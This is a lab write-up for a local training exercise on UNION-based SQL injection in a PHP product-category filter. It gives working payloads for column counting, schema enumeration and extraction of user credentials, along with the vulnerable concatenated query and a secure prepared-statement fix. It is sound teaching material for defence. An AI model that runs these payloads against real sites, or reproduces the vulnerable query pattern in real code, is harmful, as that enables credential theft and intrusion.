# Lab 4: SQL Injection UNION Attack - Complete Documentation

## 1. Lab Overview

### Purpose
This lab demonstrates a SQL injection vulnerability that allows attackers to use UNION-based attacks to retrieve sensitive data from other database tables. The vulnerability exists in the product category filter functionality where user input is directly concatenated into SQL queries without proper sanitization.

### Attack Surface
- **Vulnerable Parameter**: `category` parameter in GET request to `index.php`
- **Vulnerability Type**: SQL Injection (UNION-based)
- **Impact**: Complete database disclosure, including sensitive user credentials

### Backend Logic
The application uses a simple product catalog with category filtering:
1. User selects a product category from dropdown
2. Application constructs SQL query by concatenating user input directly
3. Results are displayed on the page
4. The same application has an admin login system with user credentials stored in a separate `users` table

### Database Structure
- **products table**: `id`, `name`, `description`, `price`, `category`, `image_url`
- **users table**: `id`, `username`, `password`, `email`, `role`, `created_at`
- **Target**: Extract data from `users` table using UNION injection through `products` query

---

## 2. Walkthrough / Step-By-Step Solution

### Step 1: Initial Reconnaissance
1. Navigate to `http://localhost/lab4/index.php`
2. Observe the category filter functionality
3. Try different categories and observe URL patterns:
   - `http://localhost/lab4/index.php?category=Electronics`
   - `http://localhost/lab4/index.php?category=Furniture`

### Step 2: Test for SQL Injection
1. Try a basic injection payload:
   ```
   http://localhost/lab4/index.php?category=Electronics'
   ```
2. **Expected Response**: MySQL error or unexpected behavior indicating SQL injection

### Step 3: Determine Number of Columns
Use ORDER BY technique to determine column count:

1. Test with different column numbers:
   ```
   http://localhost/lab4/index.php?category=Electronics' ORDER BY 1--
   http://localhost/lab4/index.php?category=Electronics' ORDER BY 2--
   http://localhost/lab4/index.php?category=Electronics' ORDER BY 3--
   http://localhost/lab4/index.php?category=Electronics' ORDER BY 4--
   ```

2. **Expected Result**: Error occurs at `ORDER BY 4`, confirming 3 columns

### Step 4: Verify UNION Compatibility
Test UNION with matching column count:

1. **Payload**:
   ```
   http://localhost/lab4/index.php?category=Electronics' UNION SELECT 'test1','test2','test3'--
   ```

2. **Server Response**: Should display products plus three additional "test" entries

3. **What Attacker Learns**: UNION injection works, query returns 3 columns of text data

### Step 5: Enumerate Database Structure
Discover table names:

1. **Payload**:
   ```
   http://localhost/lab4/index.php?category=Electronics' UNION SELECT table_name,'','tables' FROM information_schema.tables WHERE table_schema=database()--
   ```

2. **Server Response**: Reveals table names including `users` and `products`

3. **What Attacker Learns**: Database contains a `users` table that likely holds credentials

### Step 6: Enumerate Column Names
Discover column structure of users table:

1. **Payload**:
   ```
   http://localhost/lab4/index.php?category=Electronics' UNION SELECT column_name,'','users_columns' FROM information_schema.columns WHERE table_name='users'--
   ```

2. **Server Response**: Reveals columns like `username`, `password`, `role`

### Step 7: Extract User Credentials
Retrieve all usernames and passwords:

1. **Final Payload**:
   ```
   http://localhost/lab4/index.php?category=Electronics' UNION SELECT username,password,'credential' FROM users--
   ```

2. **Server Response**: Displays all user credentials mixed with product data:
   - `administrator` / `admin123!@#`
   - `john_doe` / `password123`
   - `jane_smith` / `mypassword`
   - etc.

3. **What Attacker Learns**: Complete user database including admin credentials

### Step 8: Admin Access
1. Navigate to `http://localhost/lab4/login.php`
2. Use discovered admin credentials:
   - **Username**: `administrator`
   - **Password**: `admin123!@#`
3. Successfully gain administrator access

---

## 3. Why The Exploit Works

### Internal Logic Flaw
The vulnerability exists because:

1. **No Input Sanitization**: User input is directly concatenated into SQL queries
2. **Improper Query Construction**: String concatenation instead of parameterized queries
3. **Information Disclosure**: Query results are directly displayed to users
4. **Same Database Context**: Both products and user tables exist in same database with same privileges

### Query Processing Flow
**Normal Query**:
```sql
SELECT name, description, price FROM products WHERE category = 'Electronics'
```

**Malicious Query**:
```sql
SELECT name, description, price FROM products WHERE category = 'Electronics' UNION SELECT username,password,'credential' FROM users--'
```

### UNION Requirements Met
1. **Same Column Count**: Both SELECT statements return 3 columns
2. **Compatible Data Types**: All columns contain text/varchar data
3. **Same Database**: UNION can access any table in the same database
4. **Privileges**: Web application has SELECT permissions on users table

### Root Cause
The fundamental issue is **untrusted input directly embedded in SQL commands**, violating the principle of treating user input as potentially malicious data.

---

## 4. Wrong (Vulnerable) Code Explanation

### Vulnerable Code Analysis

**File: `index.php` (Lines 20-26)**
```php
$selected_category = isset($_GET['category']) ? $_GET['category'] : '';

if (!empty($selected_category)) {
    // VULNERABLE: Direct string concatenation without sanitization
    $query = "SELECT name, description, price FROM products WHERE category = '" . $selected_category . "'";
} else {
    $query = "SELECT name, description, price FROM products";
}
```

### Line-by-Line Security Analysis

**Line 1**: `$selected_category = isset($_GET['category']) ? $_GET['category'] : '';`
- **Problem**: Raw user input is accepted without any validation or sanitization
- **Developer Assumption**: User will only provide legitimate category names
- **Reality**: Attacker can inject malicious SQL code

**Line 4**: `$query = "SELECT name, description, price FROM products WHERE category = '" . $selected_category . "'";`
- **Critical Flaw**: Direct string concatenation creates injectable SQL
- **Why Insecure**: User input becomes part of SQL command structure
- **Attack Vector**: Attacker can break out of quotes and inject arbitrary SQL

**Missing Security Measures**:
1. **No Input Validation**: No checking if input matches expected category names
2. **No Parameterized Queries**: Direct concatenation instead of prepared statements
3. **No Encoding/Escaping**: Special SQL characters not neutralized
4. **No Privilege Separation**: Same database user for app logic and sensitive data

### How It Leads to Exploitation

**Normal Input**: `Electronics`
**Resulting Query**: `SELECT name, description, price FROM products WHERE category = 'Electronics'`

**Malicious Input**: `Electronics' UNION SELECT username,password,'credential' FROM users--`
**Resulting Query**: `SELECT name, description, price FROM products WHERE category = 'Electronics' UNION SELECT username,password,'credential' FROM users--'`

**Breakdown**:
1. `Electronics'` - Completes the original WHERE clause
2. `UNION SELECT username,password,'credential' FROM users` - Adds second query to extract user data
3. `--` - Comments out the trailing quote to avoid syntax error

---

## 5. Correct Mitigation (Secure Code)

### Secure Implementation

**File: `index_secure.php` (Corrected Version)**
```php
<?php
require_once 'config.php';

// Secure version with proper input validation and parameterized queries
$conn = getConnection();

// Get all available categories (unchanged, safe query)
$categories_query = "SELECT DISTINCT category FROM products ORDER BY category";
$categories_result = $conn->query($categories_query);
$categories = [];
if ($categories_result && $categories_result->num_rows > 0) {
    while($row = $categories_result->fetch_assoc()) {
        $categories[] = $row['category'];
    }
}

// SECURE: Handle product filtering with validation and parameterized queries
$products = [];
$selected_category = isset($_GET['category']) ? trim($_GET['category']) : '';

// Input validation - whitelist approach
$valid_categories = array_merge([''], $categories); // Allow empty for "all"
if (!in_array($selected_category, $valid_categories)) {
    // Invalid category provided
    $selected_category = '';
    $error_message = "Invalid category selected.";
}

// Secure query construction using prepared statements
if (!empty($selected_category)) {
    $query = "SELECT name, description, price FROM products WHERE category = ?";
    $stmt = $conn->prepare($query);
    if ($stmt) {
        $stmt->bind_param("s", $selected_category);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result && $result->num_rows > 0) {
            while($row = $result->fetch_assoc()) {
                $products[] = $row;
            }
        }
        $stmt->close();
    }
} else {
    // Safe query for all products
    $query = "SELECT name, description, price FROM products";
    $result = $conn->query($query);
    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $products[] = $row;
        }
    }
}

$conn->close();
?>
```

### Security Measures Explanation

**1. Input Validation (Lines 23-28)**
```php
$valid_categories = array_merge([''], $categories);
if (!in_array($selected_category, $valid_categories)) {
    $selected_category = '';
    $error_message = "Invalid category selected.";
}
```
- **Whitelist Validation**: Only accept known, valid category values
- **Fail Securely**: Default to safe state when invalid input detected
- **User Feedback**: Inform user of invalid input without revealing system details

**2. Parameterized Queries (Lines 31-43)**
```php
$query = "SELECT name, description, price FROM products WHERE category = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $selected_category);
$stmt->execute();
```
- **Prepared Statements**: SQL structure separated from data
- **Parameter Binding**: User input treated as data, not executable code
- **Type Safety**: Parameter types explicitly defined

**3. Error Handling**
```php
if ($stmt) {
    // Only execute if prepare succeeded
    $stmt->execute();
    // Handle results
    $stmt->close();
}
```
- **Safe Failures**: Check preparation success before execution
- **Resource Management**: Properly close statements and connections

### Additional Security Layers

**Database Level**:
```sql
-- Create separate database user with minimal privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON lab4_sqli_union.products TO 'webapp'@'localhost';
-- Do NOT grant access to users table for web application
```

**Application Level**:
```php
// Additional input sanitization
$selected_category = filter_input(INPUT_GET, 'category', FILTER_SANITIZE_STRING);

// Length validation
if (strlen($selected_category) > 50) {
    $selected_category = '';
}

// Character filtering
if (preg_match('/[^a-zA-Z0-9\s]/', $selected_category)) {
    $selected_category = '';
}
```

---

## 6. Comparison (Wrong Code vs Fixed Code)

### Key Differences Summary

| Aspect | Vulnerable Code | Secure Code | Impact |
|--------|----------------|-------------|--------|
| **Input Handling** | Direct use of `$_GET['category']` | Validation against whitelist | Prevents malicious input |
| **Query Construction** | String concatenation | Parameterized queries | Separates code from data |
| **Error Handling** | None | Graceful degradation | Prevents information disclosure |
| **Database Access** | Full privileges | Principle of least privilege | Limits damage scope |

### Detailed Comparison

**1. Input Processing**

**Vulnerable**:
```php
$selected_category = isset($_GET['category']) ? $_GET['category'] : '';
// Direct use, no validation
```

**Secure**:
```php
$selected_category = isset($_GET['category']) ? trim($_GET['category']) : '';
$valid_categories = array_merge([''], $categories);
if (!in_array($selected_category, $valid_categories)) {
    $selected_category = '';
}
```

**What Changed**: Added input validation using whitelist approach
**Why It Matters**: Only legitimate category names are accepted, malicious SQL cannot be injected

**2. SQL Query Construction**

**Vulnerable**:
```php
$query = "SELECT name, description, price FROM products WHERE category = '" . $selected_category . "'";
```

**Secure**:
```php
$query = "SELECT name, description, price FROM products WHERE category = ?";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $selected_category);
```

**What Changed**: Switched from string concatenation to parameterized queries
**Why It Matters**: User input is treated as data parameter, not executable SQL code

**3. Attack Vector Elimination**

**How Vulnerable Code Fails**:
- Input: `Electronics' UNION SELECT username,password,'x' FROM users--`
- Result: `SELECT name, description, price FROM products WHERE category = 'Electronics' UNION SELECT username,password,'x' FROM users--'`
- Effect: Executes attacker's UNION query

**How Secure Code Prevents**:
- Same input processed through validation: Rejected (not in whitelist)
- If somehow bypassed, parameterized query treats entire input as string literal
- Result: `SELECT name, description, price FROM products WHERE category = "Electronics' UNION SELECT username,password,'x' FROM users--"`
- Effect: Searches for products with that exact (impossible) category name

**4. Defense in Depth**

The secure version implements multiple security layers:
1. **Input Validation**: First line of defense
2. **Parameterized Queries**: SQL injection prevention
3. **Error Handling**: Information disclosure prevention
4. **Principle of Least Privilege**: Database access limitation

### Security Impact Assessment

**Vulnerable Version Risk**: **CRITICAL**
- Complete database disclosure possible
- Administrative access achievable
- No detection or prevention mechanisms

**Secure Version Risk**: **LOW**
- Input validation prevents most attacks
- Parameterized queries block SQL injection
- Limited database privileges reduce potential damage
- Error handling prevents information leakage

**Conclusion**: The secure implementation eliminates the SQL injection vulnerability through comprehensive input validation, proper query construction, and defense-in-depth security principles.

---

## Setup Instructions

1. **Prerequisites**: XAMPP with Apache, PHP, and MySQL running
2. **Installation**: Copy all files to `C:\xampp\htdocs\lab4\`
3. **Database Setup**: Run `http://localhost/lab4/setup.php`
4. **Access Lab**: Navigate to `http://localhost/lab4/index.php`
5. **Test Vulnerability**: Use the payloads described in the walkthrough
6. **Complete Challenge**: Login as administrator using discovered credentials

## Learning Objectives

After completing this lab, you should understand:
- How SQL injection vulnerabilities arise from improper input handling
- The power of UNION-based attacks for data extraction
- Why parameterized queries are essential for SQL injection prevention
- The importance of input validation and defense in depth
- How to implement secure database access patterns